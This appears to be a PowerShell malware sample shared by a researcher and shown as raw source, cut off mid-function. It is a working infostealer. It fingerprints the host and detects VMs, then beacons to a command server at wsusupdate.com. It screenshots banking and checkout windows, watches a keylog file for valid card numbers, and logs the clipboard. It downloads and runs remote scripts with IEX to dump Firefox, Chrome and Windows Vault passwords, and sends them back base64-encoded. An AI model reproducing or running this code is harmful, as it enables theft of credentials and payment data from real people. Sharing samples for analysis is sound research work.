#sample found by @JohnLaTwc
    #$WebPostTimer = 1200
    #$WebGetTimer = 1200
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")            
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")    
    
    function New-Mutex($MutexName) {
    
    #[CmdletBinding()][OutputType([PSObject])]
    #Param ([Parameter(Mandatory)][ValidateNotNullOrEmpty()][string]$MutexName)
    $MutexWasCreated = $false
    $Mutex = $Null
    Write-Verbose "Waiting to acquire lock [$MutexName]..."
    [void][System.Reflection.Assembly]::LoadWithPartialName('System.Threading')
    try {
        $Mutex = [System.Threading.Mutex]::OpenExisting($MutexName)
    } catch {
        $Mutex = New-Object System.Threading.Mutex($true, $MutexName, [ref]$MutexWasCreated)
    }
    try { if (!$MutexWasCreated) { $Mutex.WaitOne() | Out-Null } } catch { }
    Write-Verbose "Lock [$MutexName] acquired. Executing..."
    Write-Output ([PSCustomObject]@{ Name = $MutexName; Mutex = $Mutex })
} # New-Mutex
function Remove-Mutex {
    <#
    .SYNOPSIS
    Removes a previously created Mutex
    .DESCRIPTION
    This function attempts to release a lock on a mutex created by an earlier call
    to New-Mutex.
    .PARAMETER MutexObject
    The PSObject object as output by the New-Mutex function.
    .INPUTS
    None. You cannot pipe objects to this function.
    .OUTPUTS
    None.
    #Requires -Version 2.0
    #>
    #[CmdletBinding()]
    #Param ([Parameter(Mandatory)][ValidateNotNull()][PSObject]$MutexObject)
    # $MutexObject | fl * | Out-String | Write-Host
    Write-Verbose "Releasing lock [$($MutexObject.Name)]..."
    try { [void]$MutexObject.Mutex.ReleaseMutex() } catch { }
} # Remove-Mutex

    new-mutex("Global\$env:username$((Get-Process -PID $pid).SessionID)")
    
    Function Get-StringHash([String] $String,$HashName = "MD5") 
    { 
    $StringBuilder = New-Object System.Text.StringBuilder 
    [System.Security.Cryptography.HashAlgorithm]::Create($HashName).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{ 
    [Void]$StringBuilder.Append($_.ToString("x2")) 
    } 
    $StringBuilder.ToString() 
    }

    Function IsVirtual
    {
                $wmibios = Get-WmiObject Win32_BIOS -ErrorAction Stop | Select-Object version,serialnumber 
                $wmisystem = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop | Select-Object model,manufacturer
                $ResultProps = @{
                    ComputerName = $computer 
                    BIOSVersion = $wmibios.Version 
                    SerialNumber = $wmibios.serialnumber 
                    Manufacturer = $wmisystem.manufacturer 
                    Model = $wmisystem.model 
                    IsVirtual = $false 
                    VirtualType = $null 
                }
                if ($wmibios.SerialNumber -like "*VMware*") {
                    $ResultProps.IsVirtual = $true
                    $ResultProps.VirtualType = "Virtual - VMWare"
                }
                else {
                    switch -wildcard ($wmibios.Version) {
                        'VIRTUAL' { 
                            $ResultProps.IsVirtual = $true 
                            $ResultProps.VirtualType = "Virtual - Hyper-V" 
                        } 
                        'A M I' {
                            $ResultProps.IsVirtual = $true 
                            $ResultProps.VirtualType = "Virtual - Virtual PC" 
                        } 
                        '*Xen*' { 
                            $ResultProps.IsVirtual = $true 
                            $ResultProps.VirtualType = "Virtual - Xen" 
                        }
                    }
                }
                if (-not $ResultProps.IsVirtual) {
                    if ($wmisystem.manufacturer -like "*Microsoft*") 
                    { 
                        $ResultProps.IsVirtual = $true 
                        $ResultProps.VirtualType = "Virtual - Hyper-V" 
                    } 
                    elseif ($wmisystem.manufacturer -like "*VMWare*") 
                    { 
                        $ResultProps.IsVirtual = $true 
                        $ResultProps.VirtualType = "Virtual - VMWare" 
                    } 
                    elseif ($wmisystem.model -like "*Virtual*") { 
                        $ResultProps.IsVirtual = $true
                        $ResultProps.VirtualType = "Unknown Virtual Machine"
                    }
                }
                $results += New-Object PsObject -Property $ResultProps
                return $ResultProps.IsVirtual
                }
         
    function Escape-JSONString($str){
	if ($str -eq $null) {return ""}
	$str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
	return $str;
}

    function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
	begin {
		$data = @()
	}
	process{
		$data += $_
	}
	
	end{
	
		if ($data.length -eq 1 -and $forceArray -eq $false) {
			$value = $data[0]
		} else {	
			$value = $data
		}

		if ($value -eq $null) {
			return "null"
		}

		

		$dataType = $value.GetType().Name
		
		switch -regex ($dataType) {
	            'String'  {
					return  "`"{0}`"" -f (Escape-JSONString $value )
				}
	            '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
	            'Int32|Double' {return  "$value"}
				'Boolean' {return  "$value".ToLower()}
	            '(System\.)?Object\[\]' { # array
					
					if ($maxDepth -le 0){return "`"$value`""}
					
					$jsonResult = ''
					foreach($elem in $value){
						#if ($elem -eq $null) {continue}
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}				
						$jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
					}
					return "[" + $jsonResult + "]"
	            }
				'(System\.)?Hashtable' { # hashtable
					$jsonResult = ''
					foreach($key in $value.Keys){
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
						$jsonResult += 
@"
	"{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
					}
					return "{" + $jsonResult + "}"
				}
	            default { #object
					if ($maxDepth -le 0){return  "`"{0}`"" -f (Escape-JSONString $value)}
					
					return "{" +
						(($value | Get-Member -MemberType *property | % { 
@"
	"{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )			
					
					}) -join ', ') + "}"
	    		}
		}
	}
}

function Get-SystemUptime ($computer = "$env:computername") {
    $lastboot = [System.Management.ManagementDateTimeconverter]::ToDateTime("$((gwmi  Win32_OperatingSystem).LastBootUpTime)")
    $uptime = (Get-Date) - $lastboot
    #Write-Host "System Uptime for $computer is: " $uptime.days "days" $uptime.hours "hours" $uptime.minutes "minutes" $uptime.seconds "seconds"
    return (($uptime.days).ToString()+"d:"+($uptime.hours).ToString()+"h:"+$uptime.minutes.ToString()+"m:"+($uptime.seconds).ToString()+"s")
}	

       
    $Screens = [system.windows.forms.screen]::AllScreens 
   
   foreach ($Screen in $Screens) {            
    $DeviceName = $Screen.DeviceName            
    $Width  = $Screen.Bounds.Width            
    $Height  = $Screen.Bounds.Height            
    $IsPrimary = $Screen.Primary            
}
    $ScreenshotPath = "$env:temp\39F28DD9-0677-4EAC-91B8-2112B1515341"
    if (-not (Test-Path $ScreenshotPath))
        {
            New-Item $ScreenshotPath -ItemType Directory -Force
        }
    $resolution = $Width.ToString()+"x"+$Height.ToString()
    $username = "$env:username".ToLower()
    $url = "https://wsusupdate.com"
    $hashid = Get-StringHash($(Get-WMIObject -class Win32_DiskDrive | Where-Object {$_.DeviceID -eq "\\.\PHYSICALDRIVE0"}).SerialNumber + `
                             $(Get-WmiObject -class Win32_OperatingSystem).SerialNumber )
    $cpu_name = $(Get-WmiObject -class "Win32_Processor" -namespace "root/CIMV2")[0].name
    if ($cpu_name -eq $null) { $cpu_name = $(Get-WmiObject -class "Win32_Processor" -namespace "root/CIMV2").name }
    $vm = IsVirtual
    $ram = ([Math]::Round((Get-WmiObject -Class win32_computersystem).TotalPhysicalMemory/1Gb)).toString()
    $os = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $os_arch = (Get-WmiObject -class Win32_OperatingSystem).OSArchitecture
    $uptime = Get-SystemUptime
    #$ext_ip = (New-Object net.webclient).downloadstring("http://checkip.dyndns.com") -replace "[^\d\.]"
    $ext_ip = ''
    $timezone = [TimeZoneInfo]::Local.BaseUtcOffset.Hours
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if ((Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections -eq 1) { $rdp = $False }
        else { $rdp = $True }
    if($IsAdmin -ne $True){ 
        if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ) { $IsAdmin  = $True }
    }

    #$wan_speed = New-Object net.webclient; "{0:N2} Mbit/sec" -f ((100/(Measure-Command {$wc.Downloadfile('http://east.testmy.net/dl-100MB',"c:\speedtest.test")}).TotalSeconds)*8); del c:\speedtest.test

    if ((gwmi win32_computersystem).partofdomain -eq $true -and (gwmi win32_computersystem).domain -ne "WORKGROUP") {
        $domain = (gwmi win32_computersystem).domain.ToUpper()
        }
    else {$domain = 'nodomain'}
    $log_file = "$env:temp\key.log"
    $version = "04a"

$params = @{"resolution" = "$resolution"; "timezone" = "$timezone"; "uptime" = "$uptime"; "computer_name" = $env:computername.ToUpper(); "isadmin" = $isadmin; "username" = "$username"; "domain" = "$domain"; "cpu_name" = "$cpu_name"; "vm" = $vm; "ram" = "$ram"; `
            "hashid" = "$hashid"; "url" = "$url"; "log_file" = "$log_file"; "Screenshot_path" = "$ScreenshotPath"; "version" = "$version"; "os" = "$os"; "os_arch" = "$os_arch"; "rdp" = "$rdp"; "ext_ip" = "$ext_ip"}



$m = $params | ConvertTo-json
$m


function Invoke-Start 
       {
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($m)
                try {
                    [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($params.url+"/start")
                    #[System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create("https://dweffweew.com/start")
                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
                    $webRequest.ContentType = "application/json"
                    $webRequest.Timeout = 10000
                    $webRequest.Method = "POST"
                    $webRequest.ContentLength = $buffer.Length;


                    $requestStream = $webRequest.GetRequestStream()
                    $requestStream.Write($buffer, 0, $buffer.Length)
                    $requestStream.Flush()
                    $requestStream.Close()

                    [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
                    $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
                    $result = $streamReader.ReadToEnd()
                    return $result
                    }
                catch {
                return $_.Exception.Message
                }
       }
          
While ($True) { 
    $response = Invoke-Start
    if ($response -eq 'null') {
        break
        }
    $response
    Start-Sleep -s 1200
    continue
              }
            


function Title-Monitor
{
Start-Job -ScriptBlock {
Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class UserWindows {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
}
"@     

        $hashid = $args[0]
        $url = $args[1]
        $username = $args[2]
        $resolution = $args[3]
        $ScreenshotPath = $args[4]

function Get-ScreenShot
{


 $OutPath = "$env:temp\39F28DD9-0677-4EAC-91B8-2112B1515341"
            Add-Type -AssemblyName System.Windows.Forms
            
            
            $fileName = '{0}.jpg' -f (Get-Date).ToString('yyyyMMdd_HHmmss')
            $path = Join-Path $ScreenshotPath $fileName 
            $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            $g = [System.Drawing.Graphics]::FromImage($b)
            $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
            $g.Dispose()
            $myEncoder = [System.Drawing.Imaging.Encoder]::Quality
            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1) 
            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($myEncoder, 20) 
            $myImageCodecInfo = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|where {$_.MimeType -eq 'image/jpeg'}
            $b.Save($path,$myImageCodecInfo, $($encoderParams))
}

Get-ScreenShot

#filter Luhn($x){$l=$x.Length-1;$l..0|%{$d=$x[$_]-48;if($_%2-eq$l%2){$s+=$d}elseif($d-le4){$s+=$d*2}else{$s+=$d*2-9}};!($s%10)}

function Luhn([int[]]$digits){
 
    [int]$sum=0
    [bool]$alt=$false

    for($i = $digits.length - 1; $i -ge 0; $i--){
        if($alt){
            $digits[$i] *= 2
            if($digits[$i] -gt 9) { $digits[$i] -= 9 }
        }

        $sum += $digits[$i]
        $alt = !$alt
    }
    
    return ($sum % 10) -eq 0
}


$luhn_matches_previous = 0
while ($True) {
    $Process = Get-Process | ? {$_.MainWindowHandle -eq ([UserWindows]::GetForegroundWindow())}

    if (Test-Path "$env:TEMP\key.log") {
        $keystring = ''
        (Get-Content $env:temp\key.log) | foreach { $keystring += $_.split(",")[0].replace('"', '') }
        $luhn_matches = @()
        Select-String -Pattern "[456][0-9]{15}|3[0-9]{14}" -InputObject $keystring -AllMatches | foreach {$_.matches} | Select-String -NotMatch "(\d)\1{5,}" | foreach { if (luhn([int[]][string[]][char[]]$_.value) -eq $true) {$luhn_matches += $True}}
        if ($luhn_matches.length -lt $luhn_matches_previous) { $luhn_matches_previous = 0 }
        if (($luhn_matches -contains $True) -and ($luhn_matches.length -gt $luhn_matches_previous)) {
            
                1..20 | % { 

                Get-ScreenShot
                Start-Sleep -Seconds 5
                
                }
                $luhn_matches_previous = $luhn_matches.length
                }
                }
                

    
    
    if (Test-Path $env:temp\keywords.txt) {
        $keywords = ((Get-Content $env:temp\keywords.txt).split(' '))[1].split('|')
        foreach ($keyword in $keywords) {if (($Process.MainWindowTitle -clike "*$keyword*" ) -and (Test-Path "$env:TEMP\key.log")) {
        1..20 | % { 
            Get-ScreenShot
            Start-Sleep -Seconds 5
                  }
                                        }
                                          }
                                          }
    if (($Process.MainWindowTitle -like '*checkout*') -or ($Process.MainWindowTitle -like '*Pay-Me-Now*') `
    -or ($Process.MainWindowTitle -like '*Sign On - Citibank*') -or ($Process.MainWindowTitle -like 'Sign in or Register | eBay')`
    -or ($Process.MainWindowTitle -like '*Credit Card*') -or ($Process.MainWindowTitle -like '*Place Your Order*') `
    -or ($Process.MainWindowTitle -clike '*Banking*') -or ($Process.MainWindowTitle -like '*Log in to your PayPal account*') `
    -or ($Process.MainWindowTitle -like '*Expedia Partner*Central*') -or ($Process.MainWindowTitle -like '*Booking.com Extranet*') `
    -or ($Process.MainWindowTitle -like '*Chase Online - Logon*') -or ($Process.MainWindowTitle -like '*One Time Pay*') `
    -or ($Process.MainWindowTitle -clike '*LogMeIn*') -or ($Process.MainWindowTitle -clike '*Windows Security*') `
    -or ($Process.MainWindowTitle -like '*Choose a way to pay*') -or ($Process.MainWindowTitle -like '*payment information*') `
    -or ($Process.MainWindowTitle -clike '*Change Reservation*') -or ($Process.MainWindowTitle -clike '*POS*') `
    -or ($Process.MainWindowTitle -like '*Virtual*Terminal*') -or ($Process.MainWindowTitle -like '*PayPal: Wallet*') `
    -or ($Process.MainWindowTitle -like '*iatspayment*') -or ($Process.MainWindowTitle -like '*LogMeIn*') `
    -or ($Process.MainWindowTitle -clike '*Authorize.Net*') -or ($Process.MainWindowTitle -like '*LogMeIn*') `
    -or ($Process.MainWindowTitle -clike '*Discover Card*') -or ($Process.MainWindowTitle -like '*LogMeIn*') `
    -or ($Process.MainWindowTitle -like '*ewallet*') -or ($Process.MainWindowTitle -like '*arcot*') `
    -or ($Process.MainWindowTitle -clike '*PayTrace*') -or ($Process.MainWindowTitle -clike '*New Charge*') `
    -or ($Process.MainWindowTitle -clike '*Verification*') -or ($Process.MainWindowTitle -clike '*PIN*') `
    -or ($Process.MainWindowTitle -clike '*Authentication*') -or ($Process.MainWindowTitle -clike '*Password*') `
    -or ($Process.MainWindowTitle -clike '*Debit Card*') -or ($Process.MainWindowTitle -clike '*Activation*') `
    -or ($Process.MainWindowTitle -clike '*LastPass*') -or ($Process.MainWindowTitle -clike '*SSN*') `
    -or ($Process.MainWindowTitle -clike '*Driver*License*') -or ($Process.MainWindowTitle -clike '*Check-in for*') `
    -or ($Process.MainWindowTitle -clike '*Umpqua*') -or ($Process.MainWindowTitle -clike '*ePayment*') `
    -or ($Process.MainWindowTitle -clike '*Converge -*') -or ($Process.MainWindowTitle -clike '*Swipe*') `
    -or ($Process.MainWindowTitle -like '*Payrazr*') -or ($Process.MainWindowTitle -clike '*Hosted -*') `
    -and (Test-Path "$env:TEMP\key.log")) {
    1..20 | % { 

    Get-ScreenShot
    Start-Sleep -Seconds 5
}
}
Start-Sleep -Seconds 5
}
} -ArgumentList $params.hashid, $params.url, $params.username, $params.resolution, $params.Screenshot_Path
}

 
function Gclip {
    Start-Job -ScriptBlock {

        $PollInterval = 3
    

    Add-Type -AssemblyName System.Windows.Forms

    # used to check if the contents have changed
    $PrevLength = 0
    $PrevFirstChar = ""

    for(;;){

            # stolen/adapted from http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/
            $tb = New-Object System.Windows.Forms.TextBox
            $tb.Multiline = $true
            $tb.Paste()

            # only output clipboard data if it's changed
            if (($tb.Text.Length -ne 0) -and ($tb.Text.Length -ne $PrevLength)){
                # if the length isn't 0, the length has changed, and the first character
                # has changed, assume the clipboard has changed
                # YES I know there might be edge cases :)
                if($PrevFirstChar -ne ($tb.Text)[0]){
                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                    #Out-File -FilePath "$env:Temp\Applnsights_VisualStudio.txt" -Append -InputObject "`========== CLIPBOARD ==========`n" -Encoding unicode
                    Out-File -FilePath "$env:Temp\Applnsights_VisualStudio.txt" -Append -InputObject $tb.Text -Encoding unicode
                    $PrevFirstChar = ($tb.Text)[0]
                    $PrevLength = $tb.Text.Length 
                }
            }
        
        Start-Sleep -s $PollInterval
    }
    }
}    


function GetFF {
    Start-Job -ScriptBlock {
       function Escape-JSONString($str){
	if ($str -eq $null) {return ""}
	$str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
	return $str;
}

    function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
	begin {
		$data = @()
	}
	process{
		$data += $_
	}
	
	end{
	
		if ($data.length -eq 1 -and $forceArray -eq $false) {
			$value = $data[0]
		} else {	
			$value = $data
		}

		if ($value -eq $null) {
			return "null"
		}

		

		$dataType = $value.GetType().Name
		
		switch -regex ($dataType) {
	            'String'  {
					return  "`"{0}`"" -f (Escape-JSONString $value )
				}
	            '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
	            'Int32|Double' {return  "$value"}
				'Boolean' {return  "$value".ToLower()}
	            '(System\.)?Object\[\]' { # array
					
					if ($maxDepth -le 0){return "`"$value`""}
					
					$jsonResult = ''
					foreach($elem in $value){
						#if ($elem -eq $null) {continue}
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}				
						$jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
					}
					return "[" + $jsonResult + "]"
	            }
				'(System\.)?Hashtable' { # hashtable
					$jsonResult = ''
					foreach($key in $value.Keys){
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
						$jsonResult += 
@"
	"{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
					}
					return "{" + $jsonResult + "}"
				}
	            default { #object
					if ($maxDepth -le 0){return  "`"{0}`"" -f (Escape-JSONString $value)}
					
					return "{" +
						(($value | Get-Member -MemberType *property | % { 
@"
	"{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )			
					
					}) -join ', ') + "}"
	    		}
		}
	}
}

            $url = $args[0]
            
            $resolution = $args[1]
            $domain = $args[2]
            $computer_name = $args[3]
            $username = $args[4]
            $timezone = $args[5]
            $hashid = $args[6]
            $version = $args[7]    

        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        & cmd /c %systemroot%\syswow64\windowspowershell\v1.0\powershell.exe "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (New-Object Net.WebClient).DownloadString('https://wsusupdate.com/script?id=random&name=firefox'); Get-FoxDump -OutFile $env:temp\firefox.log; Exit"
        & cmd /c %systemroot%\system32\windowspowershell\v1.0\powershell.exe "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (New-Object Net.WebClient).DownloadString('https://wsusupdate.com/script?id=random&name=firefox'); Get-FoxDump -OutFile $env:temp\firefox.log; Exit"
   
            If (Test-Path "$env:temp\firefox.log") { 
            $content = Get-Content $env:temp\firefox.log | Out-String
            $content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
            $json = @{"resolution" = $resolution; "domain" = $domain; "computer_name" = $computer_name; "username" = $username; "timezone" = $timezone; "hashid" = $hashid; "version" = $version; "content" = $content; "type" = "ffbrwpwd"}
            $log_json = $json | ConvertTo-Json
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($log_json)
            [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url+"/pshlog")
            $webRequest.ContentType = "application/json"
            $webRequest.Timeout = 10000
            $webRequest.Method = "POST"
            $webRequest.ContentLength = $buffer.Length;
            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($buffer, 0, $buffer.Length)
            $requestStream.Flush()
            $requestStream.Close()

            [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
            $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
            $result = $streamReader.ReadToEnd()
            Remove-Item "$env:temp\firefox.log"
            }
            } -ArgumentList $params.url, $params.resolution, $params.domain, $params.computer_name, $params.username, $params.timezone, $params.hashid, $params.version
            }

function GetChrome {
    Start-Job -ScriptBlock {
       function Escape-JSONString($str){
	if ($str -eq $null) {return ""}
	$str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
	return $str;
}

    function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
	begin {
		$data = @()
	}
	process{
		$data += $_
	}
	
	end{
	
		if ($data.length -eq 1 -and $forceArray -eq $false) {
			$value = $data[0]
		} else {	
			$value = $data
		}

		if ($value -eq $null) {
			return "null"
		}

		

		$dataType = $value.GetType().Name
		
		switch -regex ($dataType) {
	            'String'  {
					return  "`"{0}`"" -f (Escape-JSONString $value )
				}
	            '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
	            'Int32|Double' {return  "$value"}
				'Boolean' {return  "$value".ToLower()}
	            '(System\.)?Object\[\]' { # array
					
					if ($maxDepth -le 0){return "`"$value`""}
					
					$jsonResult = ''
					foreach($elem in $value){
						#if ($elem -eq $null) {continue}
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}				
						$jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
					}
					return "[" + $jsonResult + "]"
	            }
				'(System\.)?Hashtable' { # hashtable
					$jsonResult = ''
					foreach($key in $value.Keys){
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
						$jsonResult += 
@"
	"{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
					}
					return "{" + $jsonResult + "}"
				}
	            default { #object
					if ($maxDepth -le 0){return  "`"{0}`"" -f (Escape-JSONString $value)}
					
					return "{" +
						(($value | Get-Member -MemberType *property | % { 
@"
	"{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )			
					
					}) -join ', ') + "}"
	    		}
		}
	}
}

            $url = $args[0]
            
            $resolution = $args[1]
            $domain = $args[2]
            $computer_name = $args[3]
            $username = $args[4]
            $timezone = $args[5]
            $hashid = $args[6]
            $version = $args[7]    
        

        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        & cmd /c %systemroot%\system32\windowspowershell\v1.0\powershell.exe "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (New-Object Net.WebClient).DownloadString('https://wsusupdate.com/script?id=random&name=chrome'); Stop-Process -name chrome -ErrorAction SilentlyContinue; Start-sleep -seconds 3; Get-ChromeDump -OutFile $env:temp\chrome.log; Exit"
            Start-Sleep -Seconds 60
            If (Test-Path "$env:temp\chrome.log") { 
            #$content = [IO.File]::ReadAllText("$env:temp\chrome.log")
            $content = Get-Content "$env:temp\chrome.log" | Out-String
            $content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
            $json = @{"resolution" = $resolution; "domain" = $domain; "computer_name" = $computer_name; "username" = $username; "timezone" = $timezone; "hashid" = $hashid; "version" = $version; "content" = $content; "type" = "chbrwpwd"}
            $log_json = $json | ConvertTo-Json
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($log_json)
            write-host $buffer
            $url+'/pshlog'
            [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url+'/pshlog')
            $webRequest.ContentType = "application/json"
            $webRequest.Timeout = 10000
            $webRequest.Method = "POST"
            $webRequest.ContentLength = $buffer.Length;


            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($buffer, 0, $buffer.Length)
            $requestStream.Flush()
            $requestStream.Close()

            [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
            $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
            $result = $streamReader.ReadToEnd()
            }
            } -ArgumentList $params.url, $params.resolution, $params.domain, $params.computer_name, $params.username, $params.timezone, $params.hashid, $params.version
        }

function GetVault {
    Start-Job -ScriptBlock {
       function Escape-JSONString($str){
	if ($str -eq $null) {return ""}
	$str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
	return $str;
}

    function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
	begin {
		$data = @()
	}
	process{
		$data += $_
	}
	
	end{
	
		if ($data.length -eq 1 -and $forceArray -eq $false) {
			$value = $data[0]
		} else {	
			$value = $data
		}

		if ($value -eq $null) {
			return "null"
		}

		

		$dataType = $value.GetType().Name
		
		switch -regex ($dataType) {
	            'String'  {
					return  "`"{0}`"" -f (Escape-JSONString $value )
				}
	            '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
	            'Int32|Double' {return  "$value"}
				'Boolean' {return  "$value".ToLower()}
	            '(System\.)?Object\[\]' { # array
					
					if ($maxDepth -le 0){return "`"$value`""}
					
					$jsonResult = ''
					foreach($elem in $value){
						#if ($elem -eq $null) {continue}
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}				
						$jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
					}
					return "[" + $jsonResult + "]"
	            }
				'(System\.)?Hashtable' { # hashtable
					$jsonResult = ''
					foreach($key in $value.Keys){
						if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
						$jsonResult += 
@"
	"{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
					}
					return "{" + $jsonResult + "}"
				}
	            default { #object
					if ($maxDepth -le 0){return  "`"{0}`"" -f (Escape-JSONString $value)}
					
					return "{" +
						(($value | Get-Member -MemberType *property | % { 
@"
	"{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )			
					
					}) -join ', ') + "}"
	    		}
		}
	}
}

            $url = $args[0]
            $resolution = $args[1]
            $domain = $args[2]
            $computer_name = $args[3]
            $username = $args[4]
            $timezone = $args[5]
            $hashid = $args[6]
            $version = $args[7]                      
            $vault_url = $url+'/script?id=random&name=vault'
            Write-host $vault_url
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            IEX (New-Object Net.WebClient).DownloadString($vault_url); Get-VaultCredential -OutVariable vaultcreds -ErrorAction SilentlyContinue
            #Write-host 'ERROR'
            #$vaultcredserror
            $vaultcreds = $vaultcreds | Out-String
            $content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($vaultcreds))
            if ($content.length -ne 0) {
                $json = @{"resolution" = $resolution; "domain" = $domain; "computer_name" = $computer_name; "username" = $username; "timezone" = $timezone; "hashid" = $hashid; "version" = $version; "content" = $content; "type" = "vault"}
                $json
                $log_json = $json | ConvertTo-Json

                $buffer = [System.Text.Encoding]::UTF8.GetBytes($log_json)
                write-host $buffer
                
                [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url+'/pshlog')
                $webRequest.ContentType = "application/json"
                $webRequest.Timeout = 10000
                $webRequest.Method = "POST"
                $webRequest.ContentLength = $buffer.Length;


                $requestStream = $webRequest.GetRequestStream()
                $requestStream.Write($buffer, 0, $buffer.Length)
                $requestStream.Flush()
                $requestStream.Close()

                [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
                $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
                $result = $streamReader.ReadToEnd()
                                    }

                           } -ArgumentList $params.url, $params.resolution, $params.domain, $params.computer_name, $params.username, $params.timezone, $params.hashid, $params.version
                  }                 
    

function WebGet {
    Start-Job -ScriptBlock {
            $url = $args[0]
            $resolution = $args[1]
            $domain = $args[2]
            $computer_name = $args[3]
            $username = $args[4]
            $timezone = $args[5]
            $hashid = $args[6]
            $version = $args[7]      
        while ($true) {
            $WebClient=New-Object net.webclient
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            $String=$WebClient.DownloadString($url+"/command?domain=$domain&username=$username&hashid=$hashid&computer_name=$computer_name&ver=$version")
            if ($String -ne '0') { 
                foreach ($cmd in ($string -split '["\n\r"|"\r\n"|\n|\r]')) {
                   if ($cmd.StartsWith("+screenshot",1)) { $cmd | Out-File $env:temp\keywords.txt }
                   elseif ($cmd.StartsWith("-screenshot",1)) { Remove-Item $env:temp\keywords.txt }
                   elseif ($cmd.StartsWith("+vnc", 1)) {
